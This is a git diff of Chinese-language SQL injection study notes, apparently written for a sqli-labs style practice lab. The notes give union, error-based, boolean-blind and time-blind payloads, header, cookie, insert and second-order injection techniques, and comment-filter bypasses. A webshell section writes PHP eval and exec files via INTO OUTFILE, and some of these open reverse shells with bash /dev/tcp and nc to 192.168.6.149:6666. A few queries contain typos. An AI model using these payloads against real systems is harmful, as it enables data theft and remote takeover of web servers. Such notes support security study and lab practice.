@@ -18,6 +18,29 @@ select * from users where id=1 union select 1,'<?php exec('/bin/bash -c 'bash -i
 
 -- 正确写法
 select * from users where id=1 union select 1,'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/192.168.6.149/6666 0>&1\'") ?>',3 into outfile '/var/www/html/1.php';
+
+
+-- 4、group_concat和concat
+-- group_concat是查询的某一个row的结合，将会把id的结果集作为一个结果返回
+select group_concat(id) from security.users; 
+
+-- concat是将其()内的参数组合在一起显示
+
+
+-- 5、逻辑关键字WHERE和and与or
+-- where将返回使得条件为真的结果，而非返回简单的真和假
+-- and运算符的优先级高于or
+-- 空或者空格''不代表1和0，它也是一个条件
+
+-- 对于and，它要求查询到的内容必须满足id=1和id=2这两个条件，显然没有任何一个数据能满足，因此返回空
+where id=1 and id=2;
+-- 对于or，它要求查询到的内容要么满足id=1，要么满足id=2，那显然有两个数据可以满足，因此返回两个结果
+where id=1 or id=2;
+
+-- 对于and，它要求查询到的内容必须满足id=1和1这两个条件，显然1永远被满足，因为只有id=1同时满足两个条件，返回id=1的结果
+where id=1 and 1;
+-- 对于or，它要求查询到的内容要么满足id=1，要么满足1，显然1永远被满足，因为只满足一个条件即可，因此返回所有结果
+where id=1 or 1;
 ```
 
 ```sql
@@ -129,7 +152,31 @@ drop database xxx_base;
 ## 手注思路
 
 ```sql
--- 1、判断是否有注入
+-- 1、判断在哪检测注入
+-- URL注入
+GET请求传递参数时
+-- POST注入
+POST请求传递参数时，包括JSON/XML
+-- header注入（报错注入偏多，少有回显）
+-- 服务器可能会将请求头中的信息用于数据库查询或日志记录（日志插到数据库日志表）
+-- 如果服务端只记录成功执行某操作的数据和日志的话，在注入时要以能成功执行该操作为前提
+User-Agent: 客户端使用的操作系统、浏览器版本
+Cookie: 辨别用户身份，免登录，一般是加密的，存储在用户本地
+Host: 客户端自己指定想访问的域名、ip、端口号
+X-Forwarded-For: 代表客户端真实IP，可以伪造（服务端可以用REMOTE_ADDR获取真实不可伪造的IP）
+Clinet-IP: 同上
+Referer: 浏览器向服务端表明自己是从哪个页面链接过来的
+-- 文件上传注入
+存在文件上传和文件查询的情况，服务端可能会用sql查询该文件名，因此在文件名中尝试注入
+-- URL路径注入（少见）
+服务端使用URL路径的一部分作为参数处理
+-- 二次注入
+存在将数据存储到数据库的情况（例如注册），当操作（增删改查）该数据时触发，不会有实时回显，需要通过其它的进一步操作，使得利用它在数据库中进行恶意的操作（增删改查）以达成目的
+
+
+
+
+-- 2、判断是否有注入
 -- 挨着尝试 无闭合，''闭合，""闭合，('')闭合，("")闭合，((''))闭合，((""))闭合；然后加上and 1=1和and 1=2看是否存在注入，如果第一个逻辑真返回为原始查询，第二个逻辑假返回另一个结果(不一定是报错，但是肯定和原始查询结果不一样）则证明存在该闭合注入，否则不好说（可能被过滤了and逻辑或者没有注入点或者存在时间盲注点）。
 -- 这里用and的前提是and前的逻辑（原始输入）是正确的
 -- 如果原始输入是猜不到的或者不正确的，那么就使用OR尝试，OR 1=1即可
@@ -141,13 +188,17 @@ drop database xxx_base;
 
 -- --+不能用的时候试试-- qwe，可能会过滤掉+号
 
--- 2、选择注入方式
--- 联合注入（有显式回显的情况）
--- 报错注入（无显式回显的情况，前提是服务端没有正确处理sql报错，此注入方法比盲注简单，优先级大于盲注）
--- 布尔盲注（无显式回显的情况，但逻辑真和逻辑假有不同的回显）
--- 时间盲注（不仅无显式回显，连逻辑真和逻辑假都是相同的回显，即布尔盲注不可用）
+-- ps:显式回显指无论何种命令要么无论真假只返回固定一个内容（半隐），要么返回的内容和命令真假有关（假隐），要么返回的内容和命令执行结果无关（连命令真假都无关）（真隐）。
 
--- 3、联合注入
+-- 3、选择注入方式
+-- 基本注入（只能拿到部分数据）
+-- 
+-- 联合注入（有显式回显的情况）
+-- 报错注入（无显式回显的情况（半隐，假隐，真隐都可以尝试），前提是服务端没有正确处理sql报错，此注入方法比盲注简单，优先级大于盲注；另一种情况是即使有显式回显，但是显式回显只返回了无关紧要的内容（这也算没有显式回显），并没有返回命令执行的结果）
+-- 布尔盲注（无显式回显的情况，但逻辑真和逻辑假有不同的回显（假隐））
+-- 时间盲注（不仅无显式回显（三隐都可以尝试），连逻辑真和逻辑假都是相同的回显，即布尔盲注不可用）
+
+-- 4、联合注入
 -- 判断列数（row,也即字段数）
 -- 判断列数是为了后边联合查询结果和原始查询结果列保持一致，否则会报错
 -- 从1开始尝试，到报错为止即为列数（不报错证明存在第n列）
@@ -172,17 +223,24 @@ select * from users where id=1 union select 1,row1-name,row2-name from table-nam
 --将数据写入文件
 select 1,2,3 into outfile "/path/to/write"; 
 
--- 4、报错注入
+-- 5、报错注入
 -- 爆当前库名
 select * from users where id='1' and updatexml(1, concat(0x7e, (select database()), 0x7e), 3);
 select * from users where id='1' and updatexml(1, concat('!', (select database()), '!'), 3);
 -- 接下来替换select database()进行类似联合注入的手注即可
 -- 注意的是报错一般有浏览器回显的长度限制
 
--- 5、布尔盲注
+-- 6、布尔盲注
+-- 判长度
+select * from users where id='1' and length((slect databse())) = 8;
+-- 判字符(不能一口气判好几列，不能用select * from, 除非只有一列)
+select * from users where id='1' and ascii(substr((select row1 from table-name where row2=? limit 0,1), a, b)) = 97;
+
+-- 7、时间盲注
+-- 这里and后边if语句的逻辑结果是sleep()或者1，其中sleep()的为0
+-- 也就是说如果
+select * from users where id='1' and if((select database())='security', sleep(5), 1);
 ```
-
-
 
 
 
@@ -219,13 +277,19 @@ select * from users where id='1' and updatexml(1, concat('~', (select database()
 
 ## 布尔盲注详解
 
+**布尔盲注的核心是要构造正确的逻辑and和or，使得返回结果以布尔表达式的真假为唯一变量**
+
+**之所以用and是因为id=1一定对，唯一变量就成了布尔表达式**
+
+**用or是因为id='none'一定是错误的，唯一变量就成了布尔表达式**
+
 ```sql
 -- 猜名字长度length()
-select * from users where id='1' and length(database()) = name-length;
+select * from users where id='none' or length(database()) = name-length;
 -- length的参数只能是字符串或数值，不能是子查询,但是可以用括号先得到子查询的结果在给length()
-select * from users where id='1' and length((select database())) = name-length;
+select * from users where id='none' or length((select database())) = name-length;
 
--- 猜名字之取子串substr()
+-- 猜名字之取子串substr() 
 -- 取database()的从a开始长度为b的子串（从1开始）
 select * from users where id='1' and substr((select database(), a, b)) = "sub-str";
 -- 取ascii()
@@ -239,7 +303,7 @@ select * from users where id='1' and ascii(substr((select database(), a, b)) = 9
 select * from users where id='1' and length((select table_name from information_schema.tables where table_schema="security" limit 0, 1)) = 8;
 ```
 
-## 时间注入详解
+## 时间盲注详解
 
 ```sql
 -- 在尝试1=1后如果延迟返回则存在时间注入
@@ -252,6 +316,8 @@ select * from users where id=1 and if(length((select database()))=8, sleep(5), 1
 
 ## 写马
 
+前提是要知道网站的路径，可以选择
+
 ```sql
 -- 1、into outfile
 -- webshell
@@ -260,4 +326,81 @@ select * from users where id=1 union select 1,'<?php eval($_REQUEST[cmd]) ?>',3 
 select * from users where id=1 union select 1,'<?php exec(\'bash -c "bash -i >& /dev/tcp/192.168.6.149/6666 0>&1" \') ?>',3 into outfile '/var/www/html/php_name.php';
 select * from users where id=1 union select 1,'<?php exec("nc 192.168.6.149 6666") ?>',3 into outfile '/var/www/html/php_name.php';
 ```
+
+## 数据库插入命令注入详解
+
+```sql
+-- 1、对于插入数据库命令，values的参数可以是逻辑，比如and 1=1，因此可以采用盲注和报错注入
+insert into (datbase-name.)table-name (row1, row2, row3) values (value1, value2, value3);
+===>
+-- 要注意闭合问题，一般values的参数不是整型就是字符型，因此就是无闭合和有''和""，几乎没别的情况
+insert into (datbase-name.)table-name (row1, row2, row3) values ('' and updatexml(1,concat(~,(select database()),~),3), value2, value3);
+
+```
+
+## cookie注入详解
+
+```sql
+-- cookie的设置可能存在重定向的情况。
+-- 浏览器在收到一个设置cookie的重定向报文后，不会解析和返回查看重定向报文的载荷，而是直接对重定向目的进行请求。因此浏览器不会渲染回复的重定向报文，而是直接渲染对重定向目的的回复报文。
+
+-- 很多情况下cookie会被编码， 比如base64，需要对整个cookie和注入命令重新编码输入（改变一个属整个编码值都改变，类似hash）
+```
+
+## 二次注入详解
+
+```sql
+-- 第一种
+-- 注册时用户名以name'#或者name'-- q注册
+-- 在修改密码时，没有对修改密码使用的http传入参数作过滤，从而导致对name'#用户修改密码变成了对name用户修改密码
+update table-name set row1='$_value1' where username='$username' and row3='$_value3'
+```
+
+
+
+# 过滤方式及对应绕过方式
+
+## 1、过滤注释符--
+
+过滤注释符时，绕过的核心思想是利用逻辑or '、or "、and '、and "等闭合之前的引号
+
+```sql
+-- 1、隐式查询+条件逻辑闭合方式
+select * from users where id='$_inject';
+-- 报错注入
+$_inject:' and updatexml(1,concat(0x7e,(select database()),0x7e),3) or/and '1'='1
+===>
+select * from users where id='' and updatexml(1,concat(0x7e,(select database()),0x7e),3) or/and '1'='1';
+-- 布尔盲注
+$_inject:' or length((select database()))=8 or '1'='2
+===>
+select * from users where id='' or length((select database()))=8 or '1'='2';
+
+
+
+
+-- 2、联合查询+条件逻辑闭合方式
+select * from users where id='$_inject';
+
+-- 通过调整null数替代order by爆查询列数
+$_inject:' union select null,null,null from information_schema.schemata where schema_name=1 or/and '1'='1
+===>select * from users where id='' union select null,null,null from information_schema.schemata where schema_name=1 or/and '1'='1';
+
+-- 爆当前库名
+$_inject:' union select 1,(select database()),3 from information_schema.schemata where schema_name=1 or/and '1'='1
+===>select * from users where id='' union select 1,(select database()),3 from information_schema.schemata where schema_name=1 or/and '1'='1';
+
+--爆表名(没法用limit，但可以用group_concat()和table_name!=''慢慢爆表名；或者再嵌套一层union select去闭合引号可以用limit)
+$_inject:' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' or '1'='2
+$_inject:' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' and '1'='1
+===>select * from users where id='' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' or '1'='2';
+
+-- 利用逻辑非!=进一步爆所有表名
+$_inject:' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' and table_name!='emails' or '1'='2
+===>select * from users where id='' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' and table_name!='emails' or '1'='2';
+```
+
+'and updatexml(1,concat(0x7e,(select database()),0x7e),3) or '1'='1
+
+update xxx_table set row_1 = '' where row_2 = '';
 
